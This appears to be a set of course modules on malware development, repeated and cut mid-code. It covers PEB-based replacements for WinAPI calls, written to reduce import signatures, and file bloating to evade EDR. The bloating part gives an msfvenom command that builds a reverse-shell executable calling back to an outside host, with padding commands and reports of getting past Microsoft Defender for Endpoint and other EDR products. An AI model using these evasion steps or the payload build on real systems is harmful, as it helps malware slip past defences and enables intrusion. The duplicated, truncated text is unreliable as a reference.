// A helper function that returns a pointer to the PEB structure
PPEB GetPeb () {

#if _WIN64
	return (PPEB)(__readgsqword(0x60));
#elif _WIN32
	return (PPEB)(__readfsdword(0x30));
#endif

	return NULL;
}


VOID PrintAllEnvValues() {

    // Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return;
    
        // Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE pTmp = (PBYTE)pPeb->ProcessParameters->Environment;
    
        // Loop to enumerate all pTmp's elements
	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

		// Print "pTmp"
		wprintf(L"%s \n\n", pTmp);

		// Add the size (in bytes) of the current environemnt variable to the pointer
		// The "+ sizeof(WCHAR)" is to skip the null terminator of the current environemnt variable
		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}
}
```

`PrintAllEnvValues`??return the following output, which again is truncated due to its size.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-535287808-83ccc08b-8a15-4a73-a5df-b431cffd7d7b.png)

### Utilizing Environment Variables

This section will introduce four functions that will use the same enumeration algorithm explained earlier.

- `GetTmpPath`??- Replacing??[GetTempPathW](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-gettemppathw), used to retrieve the path of the "Temp" directory.
    
- `GetAppDataPath`??- Retrieve the path of the "AppData" directory.
    
- `GetWinDirPath`??- Replacing??[GetWindowsDirectoryW](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectoryw), used to retrieve the path of the "Windir" directory.
    
- `GetNumberOfProcessors`??- Retrieve the number of processors in the system.
    

#### GetTmpPath

The "Temp" directory, derived from "Temporary" directory, serves as a temporary storage location for files generated during application installations or program execution. Temporary files are created when an application requires temporary data storage, such as when downloading files from the internet or executing resource-intensive processes that demand additional disk space.

Looking at??`PrintAllEnvValues`'s output, one can notice a??`TEMP`??environment variable that contains the path to the temp directory of the system as shown below.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-635111325-ba8a5dc9-a28b-426e-bb8c-f9d53d90abc5.png)

The??`GetTmpPath`??function shown below utilizes this information to return the temp directory path. It does this by searching for the "TEMP" keyword, then it skips over the equal sign to return a pointer to the start of the path, which is the temp directory path.

```c
PWSTR GetTmpPath() {

    // Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;
        
    // Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE	pTmp = (PBYTE)pPeb->ProcessParameters->Environment;

	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

        // If 'pTmp' starts with the "TEMP" keyword, break
		if (*(ULONG_PTR*)pTmp == *(ULONG_PTR*)L"TEMP")
			break;
            
        // Else, move to to the next element
		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}


	if (pTmp) {
		// The length of "pTmp" in bytes
		int j = lstrlenW(pTmp) * sizeof(WCHAR);
		
		for (int i = 0; i <= j; i++) {
			if ((WCHAR)pTmp[i] == (WCHAR)L'=')
				return (PWSTR)&pTmp[i + sizeof(WCHAR)]; // skipping the equal sign
		}
	}
	
	
	return NULL;
}
```

#### GetAppDataPath

The "AppData" directory, also known as the "Application Data" folder, is a hidden folder on the Windows system that stores user-specific application data, typically under "C:\Users\username\AppData". Applications can use the??`AppData`??directory to store user-specific settings, configuration files, caches, and other user-specific data.

Within the AppData directory, there are three sub-folders:

- `Local`??- Contains data that is specific to the machine it is stored on.
    
- `Roaming`??- Contains data that is synchronized with other computers when the user logs in with their account.
    
- `LocalLow`??- Contains data that is specific to low-integrity applications, such as Internet Explorer's Protected Mode.
    

To fetch AppData's directory path, the previously explained algorithm used for??`GetTmpPath`??will be used. The only difference is the keyword that??`GetAppDataPath`??searches for; "APPDATA" instead of "TEMP".

```c
PWSTR GetAppDataPath() {

	// Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;

	// Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE	pTmp = (PBYTE)pPeb->ProcessParameters->Environment;

	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

		// If 'pTmp' starts with the "APPDATA" keyword, break
		if (*(ULONG_PTR*)pTmp == *(ULONG_PTR*)L"APPDATA")
			break;
		
		// Else, move to to the next element
		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}


	if (pTmp) {
		// The length of "pTmp" in bytes
		int j = lstrlenW(pTmp) * sizeof(WCHAR);

		for (int i = 0; i <= j; i++) {
			if ((WCHAR)pTmp[i] == (WCHAR)L'=')
				return (PWSTR)&pTmp[i + sizeof(WCHAR)];  // skipping the equal sign
		}
	}


	return NULL;
}
```

#### GetWinDirPath

The??`WinDir`??directory, short for "Windows Directory", is a folder in Windows that contains the core files and system components necessary for the operating system to function properly. The??`WinDir`??directory is typically located in the root directory of the system drive (usually C:) and includes subfolders such as "System32" and "SysWOW64" that contain essential system files, libraries, drivers, and executables.

The??`GetWinDirPath`??function searches for the "windir" keyword, skips over the equal sign and returns a pointer to the beginning of the??`WinDir`??path, as demonstrated in previous functions.

```c
PWSTR GetWinDirPath() {

	// Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;

	// Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE	pTmp = (PBYTE)pPeb->ProcessParameters->Environment;

	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

		// If 'pTmp' starts with the "windir" keyword, break
		if (*(ULONG_PTR*)pTmp == *(ULONG_PTR*)L"windir")
			break;

		// Else, move to to the next element
		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}


	if (pTmp) {
		// The length of "pTmp" in bytes
		int j = lstrlenW(pTmp) * sizeof(WCHAR);
		
		for (int i = 0; i <= j; i++) {
			if ((WCHAR)pTmp[i] == (WCHAR)L'=')
				return (PWSTR)&pTmp[i + sizeof(WCHAR)]; // skipping the equal sign
		}
	}


	return NULL;
}
```

#### GetNumberOfProcessors

Unlike the previous functions,??`GetNumberOfProcessors`??can be further utilized as an anti-analysis approach, where detecting a small number of processors can be an indicator of a virtualized environment. The??`GetNumberOfProcessors`??function searches for the "NUMBER_OF_PROCESSORS" keyword, skips over the equal sign and then calls??[wcstoul](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strtoul-strtoul-l-wcstoul-wcstoul-l?view=msvc-170)??to convert the fetched value's data type from??`PWSTR`??to??`DWORD`.

`GetNumberOfProcessors`??returns the number of processors on a system based off its environment variables.

```c
DWORD GetNumberOfProcessors() { 

	// Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;

	// Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE	pTmp = (PBYTE)pPeb->ProcessParameters->Environment;

	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

		// If 'pTmp' starts with the "NUMBER" keyword, break
		if (*(ULONG_PTR*)pTmp == *(ULONG_PTR*)L"NUMBER") // NUMBER_OF_PROCESSORS
			break;

		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}


	if (pTmp) {
		// The length of "pTmp" in bytes
		int j = lstrlenW(pTmp) * sizeof(WCHAR);

		// skipping the equal sign & converting LPWSTR to DWORD
		for (int i = 0; i <= j; i++) {
			if ((WCHAR)pTmp[i] == (WCHAR)L'=')
				return (DWORD)wcstoul((PWSTR)&pTmp[i + sizeof(WCHAR)], NULL, 10);
		}
	}


	return NULL;
}
```

### Replacing GetCurrentDirectory

The??`GetCurrentDirectory`??WinAPI is used to retrieve the current directory path of the current process. The current directory value can be retrieved from within the??`CurrentDirectory`??member inside the??`RTL_USER_PROCESS_PARAMETERS`??structure. The??`CurrentDirectory`??member is declared as a??[CURDIR](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2615)??structure.

#### CURDIR Structure

The??`CURDIR`??structure is shown below.

```c
typedef struct _CURDIR
{
    UNICODE_STRING DosPath;	// UNICODE_STRING.Buffer = Directory path && UNICODE_STRING.Length = Length of path
    HANDLE Handle;
} CURDIR, *PCURDIR;
```

#### GetCurrentDir Function

The??`GetCurrentDir`??function below utilizes the previous information to return the path of the current directory of an implementation. It takes an optional parameter,??`pSize`, and sets it to the length of the returned string.

```c
PWSTR GetCurrentDir(OPTIONAL OUT PSIZE_T pSize) {
	//  Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;
		
	// If "pSize" is passed, set it to the length of the returned buffer
	if (pSize)
		*pSize = (SIZE_T)pPeb->ProcessParameters->CurrentDirectory.DosPath.Length;
		
	// return the path of the current directory 
	return (PWSTR)pPeb->ProcessParameters->CurrentDirectory.DosPath.Buffer;
}
```

### Replacing GetCommandLine

The??`GetCommandLine`??WinAPI is used to retrieve the command-line string for the current process. The??`CommandLine`??member is defined as a??`UNICODE_STRING`??structure, and is found inside the??`RTL_USER_PROCESS_PARAMETERS`??structure.

The??`GetCmdLine`??function below utilizes the previously stated information to return the command-line argument passed to the current process.??`GetCmdLine`??takes an optional parameter,??`pSize`, and sets it to the length of the returned string.

```c
PWSTR GetCmdLine(OPTIONAL OUT PSIZE_T pSize) {
	
	//  Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;

	// If "pSize" is passed, set it to the length of the returned buffer
	if (pSize)
		*pSize = (SIZE_T)pPeb->ProcessParameters->CommandLine.Length;
	
	// return the command-line string
	return (PWSTR)pPeb->ProcessParameters->CommandLine.Buffer;
}
```

### Replacing GetCurrentProcessId

`GetCurrentProcessId`??is used to retrieve the process identifier of the calling process. To replace this WinAPI, one should first check if this is doable by inspecting it under a debugger or a disassembler.

#### 64-bit Systems

The following image shows IDA's representation of the 64-bit??`GetCurrentProcessId`??WinAPI.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-735299046-e157fd3b-4155-4959-b453-31707b8515d9.png)

Based on the above image,??`GetCurrentProcessId`??executes the following instructions:

- `mov rax, gs:30h`??- Loads a value that's located at offset??`0x30`??(48 in decimal) from the??`gs`??register.
    
- `mov eax, [rax+40h]`??- Reads??`0x40`??bytes (64 in decimal) from the??`rax`??register.
    

#### 32-bit Systems

On the other hand, the 32-bit??`GetCurrentProcessId`??WinAPI looks like the following.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-835299616-4111c17e-b31b-4228-8199-cf10b73b7bae.png)

On the 32-bit system,??`GetCurrentProcessId`??executes the following instructions:

- `mov eax, large fs:18h`??- Loads a value that's located at offset??`0x18`??(24 in decimal) from the??`fs`??register.
    
- `mov eax, [eax+20h]`??- Reads??`0x20`??bytes (32 in decimal) from the??`eax`??register.
    

Based on the above analysis, when aiming to replace the functionality of??`GetCurrentProcessId`??on 64-bit systems, one should retrieve a??`DWORD`??value from a memory location located??`0x40`??bytes beyond the??`gs`??register. Whereas on 32-bit systems, the same value should be obtained from a memory location positioned??`0x20`??bytes past the??`fs`??register. The first instruction from both 64-bit and 32-bit versions is handled using the??`__readgsdword`??and??`__readfsdword`??functions, respectively.

#### _GetCurrentProcessId Function

The following function utilizes??`__readgsdword`??and??`__readfsdword`??to read the specified number of bytes.

```c
DWORD _GetCurrentProcessId() {

#if _WIN64
	return (DWORD)(__readgsdword(0x40));
#elif _WIN32
	return (DWORD)(__readfsdword(0x20));
#endif

	return NULL;
}
```

### Replacing GetCurrentThreadId

The??`GetCurrentThreadId`??WinAPI function is used to retrieve the thread identifier of the calling thread.

#### 64-bit Systems

Under IDA, the function looks like this on 64-bit systems

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-935300352-a5b9023e-537f-4ed0-b002-7ddce35d185c.png)

#### 32-bit Systems

On the other hand, on 32-bit systems,??`GetCurrentThreadId`??looks like the following

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-10-7405.png)

As one can see, both??`GetCurrentThreadId`??and??`GetCurrentProcessId`??execute similar instructions, with the only difference being the offset that they read from. On 64-bit systems,??`GetCurrentThreadId`??read the TID from??`0x48`??bytes past the??`gs`??register. While on 32-bit systems,??`GetCurrentThreadId`??reads the TID from a position of??`0x24`??bytes past the??`fs`??register.

The below??`_GetCurrentThreadId`??function utilizes the??`__readgsdword`??and??`__readfsdword`??to read the specified number of bytes.

```c
DWORD _GetCurrentThreadId() {

#if _WIN64
	return (DWORD)(__readgsdword(0x48));
#elif _WIN32
	return (DWORD)(__readfsdword(0x24));
#endif

	return NULL;
}
```

### Demo

The below images show the output of all the implemented functions.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-11-235301033-cf4fba34-0451-4555-9ee8-0e560e58519a.png)

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-12-235301123-1a360781-5b0d-42b7-af60-02ba6d7bd470.png)

### Video Demo

[![Video-Demo](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-11-235301033-cf4fba34-0451-4555-9ee8-0e560e58519a.png)](https://maldevacademy.s3.amazonaws.com/new/update-one/WinAPIRep-subs-demo.mp4)
# Evasion With File Bloating

### Introduction

File bloating is an evasion technique where a malicious file is inflated with junk data, usually by appending a large number of null bytes to the end of the file. This has been an effective technique against some security solutions because many security solutions have a limit as to the file size they are capable of scanning. This limitation exists because security solutions, specifically host-based ones, wish to avoid excessive consumption of system resources during scans to prevent the machine from experiencing lag or slowdown.

This module will demonstrate ways to bloat a file and test the effectiveness of the technique against EDRs. The binary that will be bloated in this module is one generated from Msfvenom using??`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.130 LPORT=443 -f exe -o mal.exe`.

### Appending Null Bytes

As previously mentioned, it's common to append a large number of null bytes to the file. There are many ways to do so, in this module the??`dd`??command will be used on Kali Linux.

```
# Make a copy of mal.exe
cp mal.exe mal-200mb.exe

# Add 200mb worth of null bytes to the end of the file
dd if=/dev/zero bs=1M count=200 >> mal-200mb.exe
```

It's possible to verify that null bytes were appended by using??`xxd`??to view the hex contents of the file. A large number of zeros should be appended to the end of the file.

```
xxd mal-200mb.exe | more
```

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/file-bloating-xxd-1.png)

#### EDR Test (1)

The following example shows how the detection behavior of the two files,??`mal-200mb.exe`??and??`mal.exe`??are different. While both files are eventually detected,??`mal-200mb.exe`??is only detected upon execution, therefore successfully bypassing static detection.

[![Video-Demo](https://maldevacademy.s3.amazonaws.com/new/update-two/demo-1-cover.png)](https://maldevacademy.s3.amazonaws.com/new/update-two/demo-1.mp4)

In fact, the??`mal-200mb.exe`'s process is only terminated after the network connection is established. This means that the file contents aren't being flagged, rather the network connection arising from the process is the one triggering the EDR.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/file-bloating-nc-success.png)

#### EDR Test (2)

When the same file bloating technique is implemented on a binary from another C2 framework, such as Sliver, the binary successfully runs with no issues.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/file-bloating-sliver-running.png)

The video demo is shown below.

[![Video-Demo](https://maldevacademy.s3.amazonaws.com/new/update-two/demo-2-cover.png)](https://maldevacademy.s3.amazonaws.com/new/update-two/demo-2.mp4)

### Large Metadata

Another way of bloating a file is by including large metadata during the compilation process. Including metadata within a file was demonstrated in the??_Binary Metadata Modification_??module. The steps are listed out below:

1. Create a large file of random data. In this case, a 200MB file of??`FF`??bytes was created using??`dd if=/dev/zero bs=1M count=200 | tr '\000' '\377' > file.bin`.
    
2. Create a??`.rc`??file in the Visual Studio project. Reference the??_Binary Metadata Modification_??module for a refresher if necessary.
    
3. Add??`IDR_BINARY_FILE BINARY file.bin`??to the??`.rc`??file.
    
4. Compile the solution.
    

This should create a large file that includes??`file.bin`??within the binary. To verify this claim, use??`xxd`??to inspect the binary and look for the??`FF`??bytes.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/large-metadata.png)

#### EDR Test (3)

A modified version of the code found in??_Local Payload Execution - Shellcode_??was used for this demonstration. The code was then further modified to include the large??`file.bin`??file that was shown in the previous section. Next, the binary was tested against Microsoft Defender For Endpoint and successfully executed.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/MDE-Test.png)

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/MDE-Test-2.png)

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/MDE-Test-3.png)

### Conclusion

File bloating is a simple technique that can be implemented on any binary for additional evasion. Keep in mind that different security solutions will react differently to large binaries. For example, Microsoft Defender For Endpoint still flags malicious content within a large binary. Therefore it's important to use file bloating as an added evasion technique in combination with other techniques such as payload encryption, IAT obfuscation etc.
# Custom WinAPI Functions

### Introduction

In the??_IAT Hiding & Obfuscation - Custom Pseudo Handles_??module, it was demonstrated that creating custom WinAPIs is a preferable approach over dynamically importing them (if possible). This approach reduces heuristic signatures and allows for code reuse in multiple implementations without causing an inconvenience, which can be the case when using API hashing.

Previously, WinAPI replacement functions were also found in the??[VX-API](https://github.com/vxunderground/VX-API), but this module will introduce custom WinAPI functions that are not found there.

### Custom Functions

As mentioned, this module will demonstrate how to build custom functions that replicate the functionality of specific WinAPIs. The custom functions that will be created are shown below.

#### Fetch Directory Functions

This module will utilize the??`PEB`??structure to fetch the following folders paths:

- The??**Temp**??folder path (Typically??`C:\Windows\temp`).
    
- The??**Windir**??folder path (Typically??`C:\Windows`).
    
- The??**AppData**??folder path (Typically??`C:\Users\username\AppData`).
    

#### Fetch System Processors Function

Additionally, the same search approach will be utilized to fetch the number of processors on the machine, serving as a partial replacement for the??[GetSystemInfo](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsysteminfo)??WinAPI.

#### Fetch Current Directory & Command Line

The??`PEB`??structure will also be utilized to fetch the following values:

- Current Directory Path - Replacing??[GetCurrentDirectory](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory).
    
- Process's Command Line - Replacing??[GetCommandLine](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinew).
    

#### Fetch PID & TID

Finally, the module will introduce two other functions that fetch the current PID and TID of a thread, replacing??[GetCurrentProcessId](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid)??and??[GetCurrentThreadId](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthreadid), respectively.

### Environment Variables

In Windows, environment variables are dynamic values that impact the behavior of processes running on a system. They store various data related to the operating system, including specific directory paths, domain and computer names, processor information, and more. These variables serve as placeholders, allowing applications to access specific system resources, directories, and configuration settings. Here are a few examples of environment variables:

- `%USERPROFILE%`??- This variable represents the current user's profile folder, which contains the user's files and settings.
    
- `%PATH%`??- This variable specifies the system's search path for executable files. It allows the user to run commands or programs from any directory without having to specify the full path to the executable.
    
- `%TEMP%`??- This variable points to the system's temporary folder, which is used by applications to store temporary files.
    

To view the environment variables on a machine one can run the??`set`??command on Windows Command Line or??`Get-ChildItem Env:`??on PowerShell. Microsoft discusses Powershell and environment variables??[here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-7.3). To view the value of a specific variable one can run??`echo %VARIABLE-NAME%`??on Cmd or??`$env:USERPROFILE`??in Powershell.

Environment variables are saved in the Windows Registry and are found in the following registry keys:

- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`??- Used to save system-wide environment variables.
    
- `HKEY_CURRENT_USER\Environment`??- Used to save user-specific environment variables.
    

### PEB & Environment Variables

When a process is created in Windows, a copy of the system environment variables is saved in the??`PEB`??structure. This allows the process to access the same environment variables as the parent process but also allows it to modify its copy of the environment variables without affecting the parent process or other processes on the system.

The image below shows the output of executing the??`!peb`??command in??[Windbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/windbg-overview)??(note that the output is truncated due to size constraints).

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-135334737-071c2d28-0567-432d-8434-02a04ed0c557.png)

In the??_Undocumented Structures_??module, it was noted that Microsoft's official documentation for the??`PEB`??structure was missing certain members. One of those excluded members is the??`Environment`??member, which provides information about where the environment variables are stored. Consequently, the original definition of the??`PEB`??structure lacks this important detail. To address this gap, the module will utilize the??`PEB`??definition from??[Process Hacker](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpebteb.h#L56), which includes the previously mentioned??`Environment`??member. This alternative definition allows us to access the necessary information regarding where the environment variables are saved.

### Enumerating PEB's Environment Variables

The??`Environment`??member is saved inside of the??[RTL_USER_PROCESS_PARAMETERS](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2653)??structure. This structure is found in the PEB structure, and was discussed in earlier modules - recall??_Process Argument Spoofing (1)_.??`RTL_USER_PROCESS_PARAMETERS`??is defined as below

```c
typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;                // The 'Environment' element

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG_PTR EnvironmentSize;
    ULONG_PTR EnvironmentVersion;

    PVOID PackageDependencyData;
    ULONG ProcessGroupId;
    ULONG LoaderThreads;

    UNICODE_STRING RedirectionDllName; 
    UNICODE_STRING HeapPartitionName; 
    ULONG_PTR DefaultThreadpoolCpuSetMasks;
    ULONG DefaultThreadpoolCpuSetMaskCount;
    ULONG DefaultThreadpoolThreadMaximum;
    ULONG HeapMemoryTypeMask; 
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
```

The image below shows the??`PEB`??being fetched and a breakpoint being set before the end of the execution of the program. The??`Environment`??member can then be seen within the??`PEB`??structure.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-235064778-455149f4-b06d-4320-9bf0-5dff7579fbf5.png)

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-335064916-a31d1618-6a9b-4d67-b575-bed090003efb.png)

Based on the previous image, the??`Environment`??member can be seen as a Unicode string array of environment variables, in which each element of that array is a variable. The??`PrintAllEnvValues`??function, shown below, uses that information to print all the elements of the environment variables array.

In order to iterate through the array, the??`PrintAllEnvValues`??function adds the size of the current environment variable, in bytes, to the current array pointer. This operation causes the pointer to point to the next element. This process continues until there are no remaining elements, which is detected by encountering a zero-sized string. The algorithm demonstrating this behavior is illustrated in the following image.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-435098465-bdb9470f-aa6b-4492-bb43-11decd0aab19.png)

The??`PrintAllEnvValues`??function shown below uses another helper function,??`GetPeb`, to fetch a pointer to the PEB structure.

```c
// A helper function that returns a pointer to the PEB structure
PPEB GetPeb () {

#if _WIN64
	return (PPEB)(__readgsqword(0x60));
#elif _WIN32
	return (PPEB)(__readfsdword(0x30));
#endif

	return NULL;
}


VOID PrintAllEnvValues() {

    // Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return;
    
        // Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE pTmp = (PBYTE)pPeb->ProcessParameters->Environment;
    
        // Loop to enumerate all pTmp's elements
	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

		// Print "pTmp"
		wprintf(L"%s \n\n", pTmp);

		// Add the size (in bytes) of the current environemnt variable to the pointer
		// The "+ sizeof(WCHAR)" is to skip the null terminator of the current environemnt variable
		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}
}
```

`PrintAllEnvValues`??return the following output, which again is truncated due to its size.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-535287808-83ccc08b-8a15-4a73-a5df-b431cffd7d7b.png)

### Utilizing Environment Variables

This section will introduce four functions that will use the same enumeration algorithm explained earlier.

- `GetTmpPath`??- Replacing??[GetTempPathW](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-gettemppathw), used to retrieve the path of the "Temp" directory.
    
- `GetAppDataPath`??- Retrieve the path of the "AppData" directory.
    
- `GetWinDirPath`??- Replacing??[GetWindowsDirectoryW](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectoryw), used to retrieve the path of the "Windir" directory.
    
- `GetNumberOfProcessors`??- Retrieve the number of processors in the system.
    

#### GetTmpPath

The "Temp" directory, derived from "Temporary" directory, serves as a temporary storage location for files generated during application installations or program execution. Temporary files are created when an application requires temporary data storage, such as when downloading files from the internet or executing resource-intensive processes that demand additional disk space.

Looking at??`PrintAllEnvValues`'s output, one can notice a??`TEMP`??environment variable that contains the path to the temp directory of the system as shown below.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-635111325-ba8a5dc9-a28b-426e-bb8c-f9d53d90abc5.png)

The??`GetTmpPath`??function shown below utilizes this information to return the temp directory path. It does this by searching for the "TEMP" keyword, then it skips over the equal sign to return a pointer to the start of the path, which is the temp directory path.

```c
PWSTR GetTmpPath() {

    // Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;
        
    // Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE	pTmp = (PBYTE)pPeb->ProcessParameters->Environment;

	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

        // If 'pTmp' starts with the "TEMP" keyword, break
		if (*(ULONG_PTR*)pTmp == *(ULONG_PTR*)L"TEMP")
			break;
            
        // Else, move to to the next element
		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}


	if (pTmp) {
		// The length of "pTmp" in bytes
		int j = lstrlenW(pTmp) * sizeof(WCHAR);
		
		for (int i = 0; i <= j; i++) {
			if ((WCHAR)pTmp[i] == (WCHAR)L'=')
				return (PWSTR)&pTmp[i + sizeof(WCHAR)]; // skipping the equal sign
		}
	}
	
	
	return NULL;
}
```

#### GetAppDataPath

The "AppData" directory, also known as the "Application Data" folder, is a hidden folder on the Windows system that stores user-specific application data, typically under "C:\Users\username\AppData". Applications can use the??`AppData`??directory to store user-specific settings, configuration files, caches, and other user-specific data.

Within the AppData directory, there are three sub-folders:

- `Local`??- Contains data that is specific to the machine it is stored on.
    
- `Roaming`??- Contains data that is synchronized with other computers when the user logs in with their account.
    
- `LocalLow`??- Contains data that is specific to low-integrity applications, such as Internet Explorer's Protected Mode.
    

To fetch AppData's directory path, the previously explained algorithm used for??`GetTmpPath`??will be used. The only difference is the keyword that??`GetAppDataPath`??searches for; "APPDATA" instead of "TEMP".

```c
PWSTR GetAppDataPath() {

	// Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;

	// Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE	pTmp = (PBYTE)pPeb->ProcessParameters->Environment;

	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

		// If 'pTmp' starts with the "APPDATA" keyword, break
		if (*(ULONG_PTR*)pTmp == *(ULONG_PTR*)L"APPDATA")
			break;
		
		// Else, move to to the next element
		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}


	if (pTmp) {
		// The length of "pTmp" in bytes
		int j = lstrlenW(pTmp) * sizeof(WCHAR);

		for (int i = 0; i <= j; i++) {
			if ((WCHAR)pTmp[i] == (WCHAR)L'=')
				return (PWSTR)&pTmp[i + sizeof(WCHAR)];  // skipping the equal sign
		}
	}


	return NULL;
}
```

#### GetWinDirPath

The??`WinDir`??directory, short for "Windows Directory", is a folder in Windows that contains the core files and system components necessary for the operating system to function properly. The??`WinDir`??directory is typically located in the root directory of the system drive (usually C:) and includes subfolders such as "System32" and "SysWOW64" that contain essential system files, libraries, drivers, and executables.

The??`GetWinDirPath`??function searches for the "windir" keyword, skips over the equal sign and returns a pointer to the beginning of the??`WinDir`??path, as demonstrated in previous functions.

```c
PWSTR GetWinDirPath() {

